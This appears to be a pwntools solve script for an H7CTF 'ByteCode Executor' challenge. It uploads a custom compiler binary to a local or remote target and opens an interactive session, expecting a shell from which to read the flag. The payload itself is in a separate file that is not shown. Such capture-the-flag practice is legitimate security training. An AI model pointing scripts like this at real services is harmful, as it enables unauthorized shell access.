#!/usr/bin/env python3
import subprocess
import shutil
import argparse
from pathlib import Path
from pwn import *

COMPILER_FILE = "compiler/compiler.elf"
SOURCE_FILE = "input.bin"

def send_file(p, file_data: bytes):
    p.sendline(str(len(file_data)).encode())
    p.send(file_data)

def main():
    # Parse arguments
    parser = argparse.ArgumentParser(description='Solve H7CTF ByteCode Executor Challenge')
    parser.add_argument('--remote', dest='remote', action='store_true', help='Connect to remote server')
    parser.add_argument('--host', dest='host', default='localhost', help='Remote host')
    parser.add_argument('--port', dest='port', type=int, default=9999, help='Remote port')
    parser.add_argument('--debug', dest='debug', action='store_true', help='Enable GDB debugging')
    parser.set_defaults(remote=False, debug=False)

    args = parser.parse_args()

    if not args.remote:
        if Path("workspace").is_dir():
            shutil.rmtree("workspace")

        if Path("../src/main").exists():
            p = process("../src/main")
        elif Path("../challenge/main").exists():
            p = process("../challenge/main")
        else:
            log.error("Could not find challenge binary!")
            return

        if args.debug:
            gdb.attach(p, '''
                b execute_bytecode
                c
            ''')
    else:
        log.info(f"Connecting to {args.host}:{args.port}")
        p = remote(args.host, args.port)

    # Send the custom compiler
    log.info("Sending custom compiler...")
    compiler_data = Path(COMPILER_FILE).read_bytes()
    send_file(p, compiler_data)

    # Send the input source file
    log.info("Sending input file...")
    source_data = b'\x00'  # Dummy input
    send_file(p, source_data)

    # Interact with the process to see the flag
    log.success("Exploit sent! Waiting for response...")
    log.info("A shell should spawn. Type: cat flag.txt")
    p.interactive()

if __name__ == "__main__":
    main()
